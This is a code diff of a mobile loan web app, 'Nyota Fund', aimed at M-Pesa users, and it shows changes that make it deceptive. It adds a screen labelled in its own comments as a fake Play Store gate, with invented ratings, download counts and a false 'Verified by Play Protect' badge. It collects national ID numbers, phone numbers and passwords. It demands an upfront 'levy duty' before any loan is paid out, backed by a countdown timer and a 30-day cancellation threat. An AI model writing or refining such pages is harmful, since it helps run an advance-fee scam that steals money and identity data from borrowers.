@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Nyota Portal | Secure Application</title>
+    <title>Nyota Fund</title>
     <meta name="theme-color" content="#2E7D32">
     <link rel="manifest" href="manifest.json">
 
@@ -15,10 +15,9 @@
                 fontFamily: { sans: ['"Plus Jakarta Sans"', 'sans-serif'], roboto: ['"Roboto"', 'sans-serif'] },
                 colors: {
                     brandGreen: '#2E7D32',
-                    brandLightGreen: '#4CAF50',
-                    brandRed: '#D32F2F',
-                    brandBlack: '#1A1A1A',
-                    playBlue: '#0056D2'
+                    playBlue: '#0056D2',
+                    playGreen: '#01875f',
+                    brandRed: '#D32F2F'
                 },
                 boxShadow: { soft: '0 10px 40px -10px rgba(0,0,0,0.08)' }
             } }
@@ -68,57 +67,166 @@
         .row-label { font-size: 14px; color: #64748B; font-weight: 500; }
         .row-value { font-size: 15px; font-weight: 700; color: #0F172A; }
 
+        .check-circle { width: 96px; height: 96px; background: #DCFCE7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; animation: popIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+
         .info-banner { background: #EFF6FF; border: 1px solid #DBEAFE; border-radius: 18px; padding: 16px; display: flex; gap: 12px; align-items: flex-start; }
 
         .pulse-ring { width: 120px; height: 120px; border-radius: 50%; background: rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; position: relative; }
         .pulse-ring::before { content: ''; position: absolute; inset: 0; border-radius: 50%; border: 2px solid rgba(255,255,255,0.25); animation: pulseRing 2s ease-out infinite; }
         @keyframes pulseRing { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.4); opacity: 0; } }
 
-        .check-circle { width: 96px; height: 96px; background: #DCFCE7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; animation: popIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
-        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+        #splash-screen { transition: opacity 0.4s ease-out; }
+
+        @keyframes pulseSubtle {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(226, 232, 240, 0.7); border-color: #E2E8F0; }
+            50% { box-shadow: 0 0 0 8px rgba(226, 232, 240, 0); border-color: #CBD5E1; }
+        }
+        .animate-pulse-subtle { animation: pulseSubtle 2.5s infinite; }
+        
+        /* Modal Animation */
+        @keyframes modalPop { 0% { transform: scale(0.9); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        .modal-pop { animation: modalPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
     </style>
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
 
 <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] font-sans">Message</div>
 
+<!-- 1. THE INSTALL SUCCESS MODAL -->
+<div id="install-success-modal" class="hide fixed inset-0 z-[10005] bg-slate-900/80 backdrop-blur-sm flex items-center justify-center p-6">
+    <div class="modal-pop bg-white rounded-3xl p-8 w-full max-w-sm shadow-2xl text-center">
+        <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-5">
+            <svg class="w-10 h-10 text-brandGreen" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+        </div>
+        <h2 class="text-2xl font-extrabold text-slate-900 mb-2">App Installed!</h2>
+        <p class="text-sm text-slate-500 mb-8">Nyota Fund has been successfully added to your home screen. You can now open it directly from your app drawer.</p>
+        <button onclick="closeInstallModal()" class="native-btn text-lg">Proceed to App</button>
+    </div>
+</div>
+
+<!-- OFFLINE GATE -->
+<div id="offline-gate" class="hide fixed inset-0 z-[110000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
+    <div class="w-20 h-20 bg-white/10 rounded-full flex items-center justify-center mb-6">
+        <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path>
+        </svg>
+    </div>
+    <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
+    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto font-sans">Nyota Fund requires an active internet connection to process your loan.</p>
+    <button id="btn-retry-connection" onclick="retryConnection()" class="w-full max-w-xs bg-brandRed text-white font-bold py-3.5 rounded-xl font-sans transition-transform active:scale-95">Retry</button>
+</div>
+
+<!-- 2. MINIMAL FAKE PLAY STORE GATE -->
+<div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
+    <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10 border-b border-slate-100">
+        <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+        <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
+    </div>
+    <div class="p-5 max-w-lg mx-auto">
+        <!-- App Header -->
+        <div class="flex gap-4 mb-4">
+            <div class="relative w-[104px] h-[104px] flex-shrink-0 flex items-center justify-center">
+                <svg id="ring-svg" class="hidden w-full h-full transform -rotate-90 absolute inset-0 z-10"><circle cx="52" cy="52" r="48" stroke="#F1F5F9" stroke-width="5" fill="none"/><circle id="download-ring" cx="52" cy="52" r="48" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="301.59" stroke-dashoffset="301.59" stroke-linecap="round"/></svg>
+                <img src="icon-512.png" id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl shadow-soft border border-gray-100 object-cover z-0" alt="Nyota Fund">
+            </div>
+            <div class="flex flex-col justify-center">
+                <h1 class="text-2xl font-bold text-gray-900 leading-tight">Nyota Fund</h1>
+                <p class="text-brandGreen font-semibold text-sm mt-1">Financial Services</p>
+                <p class="text-gray-500 text-xs mt-1">Contains ads • 10 MB</p>
+            </div>
+        </div>
+
+        <!-- Rating & Downloads Row -->
+        <div class="flex justify-between items-center text-center py-4 mb-4 border-y border-gray-100">
+            <div class="flex-1 flex flex-col items-center border-r border-gray-200">
+                <div class="flex items-center gap-1">
+                    <span class="font-bold text-sm">4.5</span>
+                    <svg class="w-3.5 h-3.5 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
+                </div>
+                <span class="text-[10px] text-gray-500 mt-1">12.4K reviews</span>
+            </div>
+            <div class="flex-1 flex flex-col items-center">
+                <span class="font-bold text-sm">1M+</span>
+                <span class="text-[10px] text-gray-500 mt-1">Downloads</span>
+            </div>
+        </div>
+
+        <!-- Download Progress -->
+        <div id="download-text" class="hide mb-4">
+            <span id="download-percent" class="text-sm font-semibold text-gray-700">0% of 10 MB</span>
+            <div class="flex items-center gap-1 mt-1 text-playGreen">
+                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                <span class="text-xs font-semibold">Verified by Play Protect</span>
+            </div>
+        </div>
+
+        <!-- Action Buttons -->
+        <div class="flex gap-2 mb-6" id="pre-install-buttons">
+            <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
+        </div>
+        <div class="flex gap-2 mb-6 hide" id="downloading-buttons">
+            <button class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200" style="opacity:0.5;">Cancel</button>
+            <button disabled id="btn-installing" class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full flex items-center justify-center gap-2">Downloading...</button>
+        </div>
+        <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
+            <button onclick="mockUninstall()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-3 rounded-full border border-gray-300">Uninstall</button>
+            <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full">Open</button>
+        </div>
+
+        <!-- Short Description Only -->
+        <div class="mt-4 border-t border-gray-100 pt-6">
+            <h3 class="font-bold text-lg text-gray-900 mb-2">About this app</h3>
+            <p class="text-sm text-gray-600 leading-relaxed">
+                Get instant mobile loans from Ksh 1,000 to Ksh 25,000 directly to your M-Pesa. Fast approval, low interest, and flexible terms.
+            </p>
+        </div>
+    </div>
+</div>
+
+<!-- NATIVE SPLASH SCREEN -->
+<div id="splash-screen" class="hide fixed inset-0 z-[9998] bg-[#2E7D32] flex flex-col items-center justify-center opacity-0 transition-opacity duration-300">
+    <img src="icon-512.png" class="w-24 h-24 rounded-3xl object-cover mb-4 shadow-lg border border-white/10" alt="Nyota Fund">
+    <h1 class="text-white text-xl font-bold tracking-wide font-sans">Nyota Fund</h1>
+</div>
+
 <!-- ============ APP CONTENT ============ -->
-<div id="app-content" class="font-sans">
+<div id="app-content" class="hide font-sans">
 
     <!-- LOGIN -->
     <div id="screen-login" class="screen active gradient-bg" style="padding: 24px;">
         <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
             <div class="text-center mb-8">
                 <div class="w-24 h-24 bg-white/10 rounded-3xl mx-auto flex items-center justify-center border border-white/20 mb-6"><img src="icon-512.png" class="w-16 h-16 rounded-2xl object-cover"></div>
-                <h1 class="text-white text-3xl font-extrabold tracking-tight">Nyota Portal</h1>
-                <p class="text-green-200 text-sm font-medium mt-2 tracking-wide font-bold">Secure Application</p>
+                <h1 class="text-white text-3xl font-extrabold tracking-tight">Nyota Fund</h1>
+                <p class="text-green-200 text-sm font-medium mt-2 tracking-wide font-bold">Kuza, Imarisha, Endeleza</p>
             </div>
-            <div class="bg-white rounded-2xl p-6 shadow-xl mt-4">
-                <h2 class="text-xl font-bold text-slate-900 mb-1">Create Account</h2>
-                <p class="text-sm text-slate-500 mb-6">Enter your details to check your limit</p>
+            <div class="bg-white rounded-2xl p-6 shadow-xl">
+                <h2 class="text-xl font-bold text-slate-900 mb-1">Apply Now</h2>
+                <p class="text-sm text-slate-500 mb-6">Get started with your loan in minutes</p>
                 <div class="space-y-4">
                     <div><input type="text" id="in-name" placeholder="Full Name"></div>
                     <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
                     <div><input type="tel" id="in-mpesa" placeholder="Safaricom M-Pesa (07XX or 01XX)"></div>
-                    <button onclick="submitLogin()" class="native-btn mt-4">Check Eligibility</button>
+                    <div><input type="text" id="in-promo" placeholder="Promo Code (Optional)"></div>
+                    <div><input type="password" id="in-pass" placeholder="Password (min 4 chars)"></div>
+                    <button onclick="submitLogin()" class="native-btn mt-4">Apply Now</button>
                 </div>
-                <p class="text-center text-xs text-slate-400 mt-6 font-medium"> Your data is encrypted and safe</p>
+                <p class="text-center text-xs text-slate-400 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
             </div>
         </div>
     </div>
 
-    <!-- CHECKING (Extended 12-Second Analysis) -->
+    <!-- CHECKING (15 SECONDS) -->
     <div id="screen-checking" class="screen gradient-bg items-center justify-center" style="padding: 24px;">
         <div class="pulse-ring"><img src="icon-512.png" class="w-20 h-20 rounded-2xl object-cover z-10 relative"></div>
-        <h2 class="text-white text-2xl font-bold text-center mb-2">Checking Eligibility</h2>
-        <p id="check-status" class="text-blue-200 text-sm mb-10 font-medium text-center px-4">Connecting to secure servers...</p>
-        
+        <h2 class="text-white text-2xl font-bold text-center mb-2">Setting up your account</h2>
+        <p id="check-status" class="text-blue-200 text-sm mb-10 font-medium text-center">Verifying your identity...</p>
         <div class="w-full max-w-xs bg-white/10 rounded-full h-2 mb-4 overflow-hidden">
-            <div id="check-bar" class="bg-brandGreen h-2 rounded-full transition-all duration-100" style="width: 0%"></div>
+            <div id="check-bar" class="bg-brandRed h-2 rounded-full transition-all duration-100" style="width: 0%"></div>
         </div>
         <p id="check-percent" class="text-white font-bold text-lg">0%</p>
-        
-        <p class="text-blue-200/60 text-xs mt-8 text-center">Do not close this window</p>
+        <p class="text-blue-200/60 text-xs mt-8 text-center">This usually takes a few seconds</p>
     </div>
 
     <!-- LOAN SELECTION -->
@@ -126,13 +234,22 @@
         <div class="app-bar">
             <div class="w-full">
                 <h1 class="app-bar-title">Hello, <span id="greeting-name">there</span></h1>
-                <p class="text-xs text-slate-500 mt-0.5">Your maximum limit is <strong class="font-extrabold text-brandGreen text-sm">Ksh 10,000</strong></p>
+                <p class="text-xs text-slate-500 mt-0.5">Your maximum limit is <strong class="font-extrabold text-brandGreen text-sm">Ksh 25,000</strong></p>
 
                 <div class="mt-3 bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center gap-3">
                     <div class="bg-emerald-100 p-2 rounded-full flex-shrink-0">
                         <svg class="w-5 h-5 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                     </div>
-                    <p class="text-sm text-emerald-800 font-semibold">You qualify for up to Ksh 10,000!</p>
+                    <p class="text-sm text-emerald-800 font-semibold">You qualify for up to Ksh 25,000!</p>
+                </div>
+
+                <!-- COUNTDOWN TIMER -->
+                <div class="mt-2 bg-red-50 border border-red-200 rounded-xl p-3 flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <svg class="w-5 h-5 text-red-500 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                        <p class="text-sm text-red-700 font-bold">Application ends in:</p>
+                    </div>
+                    <p id="loan-timer" class="text-base font-extrabold text-red-600 font-mono tracking-wider">11:00:00</p>
                 </div>
             </div>
         </div>
@@ -152,19 +269,19 @@
                 <div class="row-item"><span id="sum-interest-label" class="row-label">Interest (10%)</span><span id="sum-interest" class="row-value">Ksh 100</span></div>
                 <div class="row-item"><span class="row-label">Total repayment</span><span id="sum-total" class="row-value" style="color: #D32F2F; font-size: 17px;">Ksh 1,100</span></div>
                 <div class="row-item"><span class="row-label">Due date</span><span id="sum-due" class="row-value">--</span></div>
-                <div class="row-item"><span class="row-label">Processing Fee (one-time)</span><span id="sum-levy" style="font-weight: 800; color: #1A1A1A; font-size: 17px;">Ksh 150</span></div>
+                <div class="row-item"><span class="row-label">Levy Duty (one-time)</span><span id="sum-levy" style="font-weight: 800; color: #1A1A1A; font-size: 17px;">Ksh 150</span></div>
             </div>
-            <button onclick="goToPayment()" id="btn-go-payment" class="native-btn">Proceed to Payment</button>
+            <button onclick="goToPayment()" id="btn-go-payment" class="native-btn">Pay levy duty</button>
         </div>
     </div>
 
-    <!-- PAYMENT -->
+    <!-- PAYMENT (SIMPLIFIED) -->
     <div id="screen-payment" class="screen app-shell" style="padding: 0 0 32px 0;">
         <div class="app-bar">
             <button onclick="showScreen('screen-select')" class="app-bar-back">
                 <svg class="w-5 h-5 text-slate-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg>
             </button>
-            <h1 class="app-bar-title">Processing Fee</h1>
+            <h1 class="app-bar-title">Levy Duty</h1>
         </div>
         <div style="padding: 0 20px;">
 
@@ -173,7 +290,7 @@
                 <p style="font-size: 52px; font-weight: 900; color: #2E7D32; letter-spacing: -0.03em; line-height: 1;" id="pay-loan-context">Ksh 1,000</p>
 
                 <div class="mt-6 pt-5 border-t border-slate-100 flex flex-col items-center">
-                    <p style="font-size: 13px; color: #64748B; font-weight: 600; margin-bottom: 4px;">One-time Processing Fee</p>
+                    <p style="font-size: 13px; color: #64748B; font-weight: 600; margin-bottom: 4px;">One-time Levy Duty</p>
                     <p style="font-size: 24px; font-weight: 700; color: #0F172A;" id="pay-levy">Ksh 150</p>
                 </div>
             </div>
@@ -186,10 +303,19 @@
 
             <div class="info-banner" style="margin-bottom: 24px;">
                 <svg class="w-5 h-5 flex-shrink-0 text-brandGreen" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                <p style="font-size: 13px; line-height: 1.5; color: #2E7D32; font-weight: 500;">Pay the processing fee to activate your loan. Funds will be released immediately after confirmation.</p>
+                <p style="font-size: 13px; line-height: 1.5; color: #2E7D32; font-weight: 500;">Pay the small levy duty to activate your loan. Funds will be released immediately after confirmation.</p>
             </div>
 
-            <button onclick="processPayment()" id="btn-pay" class="native-btn">Pay Ksh 150</button>
+            <button onclick="showScreen('screen-select')" class="w-full bg-white text-slate-600 font-bold py-4 rounded-xl border-2 border-slate-200 mb-3 transition-all active:scale-95 hover:bg-slate-50 flex items-center justify-center gap-2 animate-pulse-subtle">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+                Maybe Later
+            </button>
+
+            <p class="text-center text-xs font-semibold text-red-600 mb-5 bg-red-50 py-2 rounded-lg border border-red-100">
+                ⏳ If you cancel, you will have to wait 30 days for re-evaluation.
+            </p>
+
+            <button onclick="processPayment()" id="btn-pay" class="native-btn">Pay Ksh 150 Levy Duty</button>
         </div>
     </div>
 
@@ -203,6 +329,7 @@
                 <p id="verify-time" style="color: #D32F2F; font-weight: 800; margin-top: 20px; font-size: 18px; background: #FEF2F2; padding: 6px 18px; border-radius: 999px; display: inline-block;">0s</p>
             </div>
 
+            <!-- SUCCESS -->
             <div id="success-anim" class="hide flex flex-col items-center">
                 <div class="check-circle">
                     <svg class="w-12 h-12 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
@@ -219,35 +346,67 @@
                     <svg class="w-5 h-5 flex-shrink-0 text-brandGreen" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                     <p style="font-size: 13px; line-height: 1.55; color: #2E7D32; font-weight: 500; text-align: left;">Your funds will be disbursed to your M-Pesa within the next <strong>24 hours</strong>.</p>
                 </div>
+                <p style="font-size: 12px; color: #94A3B8; font-weight: 500;">You may now close the app</p>
             </div>
 
+            <!-- FAILED -->
             <div id="failed-anim" class="hide flex flex-col items-center">
                 <div style="width: 96px; height: 96px; background: #FEE2E2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
                     <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg>
                 </div>
                 <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Payment Not Completed</h2>
                 <div id="failed-reason" style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 16px; padding: 0 16px; line-height: 1.5;">The M-Pesa request was cancelled or failed.</div>
-                
-                <button onclick="showScreen('screen-payment')" class="native-btn" style="margin-bottom: 12px; background: #FFFFFF; color: #475569; border: 1.5px solid #CBD5E1; display: flex; justify-content: center; align-items: center;">
-                    <span>Try Again</span>
+
+                <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 mb-6 w-full text-left">
+                    <p style="font-size: 13px; color: #334155; font-weight: 500; margin-bottom: 8px;">If your M-Pesa was deducted but you see this message:</p>
+                    <ol style="font-size: 12px; color: #64748B; list-style-type: decimal; padding-left: 16px; space-y: 4px;">
+                        <li>Wait 2 minutes for the network to sync.</li>
+                        <li>Tap "Check Status" below.</li>
+                        <li>If it still fails, contact support with your M-Pesa code.</li>
+                    </ol>
+                </div>
+
+                <button id="btn-retry-failed" class="native-btn" style="margin-bottom: 12px; background: linear-gradient(135deg, #10B981 0%, #059669 100%); color: white; font-size: 20px; box-shadow: 0 10px 25px -5px rgba(16, 185, 129, 0.7); display: flex; justify-content: center; align-items: center; border: 2px solid #34D399; font-weight: 900; letter-spacing: 0.5px; text-transform: uppercase;">
+                    <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                    TRY AGAIN
                 </button>
+
+                <button onclick="checkStatusManual()" id="btn-check-status-failed" class="native-btn" style="margin-bottom: 12px; background: #FFFFFF; color: #475569; border: 1.5px solid #CBD5E1; display: flex; justify-content: center; align-items: center; box-shadow: 0 1px 2px 0 rgba(0,0,0,0.05);">
+                    <span>Check Status</span>
+                </button>
+            </div>
+
+            <!-- PENDING -->
+            <div id="pending-anim" class="hide flex flex-col items-center">
+                <div style="width: 96px; height: 96px; background: #FEF3C7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 48px; color: #D32F2F; font-weight: 800;">?</div>
+                <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Still Confirming</h2>
+                <p style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 32px; padding: 0 16px; line-height: 1.5;">We haven't received confirmation from M-Pesa yet. Tap below to check again.</p>
+                <button onclick="checkStatusManual()" id="btn-check-status" class="native-btn" style="margin-bottom: 12px; display: flex; justify-content: center;"><span>Check Status</span></button>
+                <button onclick="retryPayment()" style="width: 100%; color: #2E7D32; font-weight: 700; padding: 12px; font-size: 14px; background: none; border: none; cursor: pointer;">Back to Payment</button>
             </div>
         </div>
     </div>
 </div>
 
 <script>
-// LIVE BACKEND CONFIGURATION
 const SUPABASE_URL = "https://zpcbfaydgbhpjqsgfluv.supabase.co";
 const SUPABASE_KEY = "sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ";
 const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
 
+const MAX_POLL_SECONDS = 60;
+
 const SUCCESS_STATUSES = ['ALLOCATED','SUCCESS','COMPLETED','PAID','SUCCESSFUL','TRUE','CONFIRMED'];
 const FAILED_STATUSES = ['FAILED','REJECTED','EXPIRED','DECLINED','FALSE','ABORTED','USER_ABORTED'];
+const PENDING_STATUSES = ['CANCELLED', 'CANCELED', 'TIMEOUT'];
 
-let state = { name:"", id:"", mpesa:"", loan:1000, levy:150, term:30, interest:100, total:1100 };
-const amounts = [1000,2000,3000,5000,7500,10000];
-let pollTimer = null, isProcessingPayment = false, toastTimeout;
+let state = { name:"", id:"", mpesa:"", promo:"", loan:1000, levy:150, term:30, interest:100, total:1100 };
+const amounts = [1000,2000,3000,5000,7500,10000,15000,20000,25000,30000,40000,50000];
+let pollTimer = null, isPolling = false, isProcessingPayment = false, currentTxnId = null, toastTimeout;
+
+let fakeInterval = null;
+let deferredPrompt = null;
+let waitingForPrompt = false;
+let loanTimerInterval = null;
 
 const format = (n) => "Ksh " + Number(n).toLocaleString();
 const getDueDate = (d) => { const x = new Date(); x.setDate(x.getDate()+d); return x.toLocaleDateString('en-GB',{day:'numeric',month:'short',year:'numeric'}); };
@@ -256,6 +415,10 @@ function showScreen(id){
     document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     window.scrollTo(0,0);
+
+    if (id !== 'screen-select') {
+        stopLoanTimer();
+    }
 }
 
 function showToast(msg){
@@ -265,71 +428,304 @@ function showToast(msg){
     toastTimeout = setTimeout(()=>{ t.classList.add('hide-toast'); setTimeout(()=>t.classList.add('hide'),300); }, 4000);
 }
 
-// LOGIN & DB SAVE
+async function retryConnection() {
+    const btn = document.getElementById('btn-retry-connection');
+    const originalText = btn.innerText;
+    btn.innerText = "Checking..."; btn.disabled = true; btn.style.opacity = "0.7";
+
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000);
+
+        const res = await fetch(window.location.href + '?t=' + Date.now(), { method: 'HEAD', cache: 'no-store', signal: controller.signal });
+        clearTimeout(timeoutId);
+
+        if (res.ok || res.status === 200) {
+            window.location.reload();
+        } else {
+            throw new Error("Network response was not ok");
+        }
+    } catch (err) {
+        if (window.showToast) window.showToast("⚠️ Still offline. Please check your connection.");
+        else alert("Still offline. Please check your internet connection and try again.");
+        btn.innerText = originalText; btn.disabled = false; btn.style.opacity = "1";
+    }
+}
+
+window.addEventListener('offline', () => { document.getElementById('offline-gate').classList.remove('hide'); });
+window.addEventListener('online', () => {
+    const gate = document.getElementById('offline-gate');
+    if (!gate.classList.contains('hide')) gate.classList.add('hide');
+});
+
+async function fetchWithTimeout(url, opts={}, ms=15000){
+    if (!navigator.onLine) {
+        document.getElementById('offline-gate').classList.remove('hide');
+        throw new Error("No internet connection");
+    }
+    const c = new AbortController();
+    const t = setTimeout(()=>c.abort(), ms);
+    try {
+        return await fetch(url, {...opts, signal:c.signal, cache:'no-store'});
+    } catch (error) {
+        if (error.name === 'TypeError' && !error.message.includes('Failed to fetch')) {
+             document.getElementById('offline-gate').classList.remove('hide');
+        }
+        throw error;
+    } finally { clearTimeout(t); }
+}
+
+async function readJsonSafe(r){ try{ const x = await r.text(); return x ? JSON.parse(x) : null; }catch(e){ return null; } }
+
+function stopPolling(){ if(pollTimer){ clearTimeout(pollTimer); pollTimer = null; } isPolling = false; }
+function resetPayButton(){
+    isProcessingPayment = false;
+    const b = document.getElementById('btn-pay');
+    if(b){
+        b.disabled = false;
+        b.innerText = `Pay ${format(state.levy)} Levy Duty`;
+        b.style.background = '';
+    }
+}
+
+const _ua = navigator.userAgent || '';
+const _isAndroid = /Android/i.test(_ua);
+const _isIOS = /iPhone|iPad|iPod/i.test(_ua);
+const _isChromeBrowser = /Chrome\/\d+/i.test(_ua) && !/Edg|OPR|SamsungBrowser|Firefox/i.test(_ua);
+const _isInApp = detectInAppBrowser(_ua);
+const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
+const _cameFromIntent = new URLSearchParams(location.search).get('_pwa') === '1';
+const _wasInstalled = localStorage.getItem('pwa_installed') === '1';
+
+function detectInAppBrowser(ua) {
+    if (/FBAN|FBAV|FB4A|FB_IAB|Instagram|Twitter|musical_ly|BytedanceWebview|TikTok|Line|Snapchat|LinkedIn|Pinterest|WhatsApp|Telegram|GSA/i.test(ua)) return true;
+    if (/; wv\)/i.test(ua)) return true;
+    if (/iPhone|iPad/i.test(ua) && !/Safari/i.test(ua) && !/CriOS/i.test(ua) && !/FxiOS/i.test(ua)) return true;
+    return false;
+}
+
+const playStoreGate = document.getElementById('play-store-gate');
+const appContent = document.getElementById('app-content');
+const splashScreen = document.getElementById('splash-screen');
+
+window.addEventListener('beforeinstallprompt', (e) => {
+    e.preventDefault();
+    deferredPrompt = e;
+});
+
+window.addEventListener('appinstalled', () => {
+    localStorage.setItem('pwa_installed', '1');
+    clearInterval(fakeInterval);
+    showInstalledState();
+});
+
+function showInstallState(){
+    document.getElementById('pre-install-buttons').classList.remove('hide');
+    document.getElementById('downloading-buttons').classList.add('hide');
+    document.getElementById('post-install-buttons').classList.add('hide');
+    document.getElementById('download-text').classList.add('hide');
+    document.getElementById('ring-svg').classList.add('hidden');
+    updateProgressUI(0);
+}
+
+function showInstalledState(){
+    document.getElementById('pre-install-buttons').classList.add('hide');
+    document.getElementById('downloading-buttons').classList.add('hide');
+    document.getElementById('post-install-buttons').classList.remove('hide');
+    document.getElementById('download-text').classList.add('hide');
+    document.getElementById('ring-svg').classList.add('hidden');
+}
+
+function mockUninstall(){
+    localStorage.removeItem('pwa_installed');
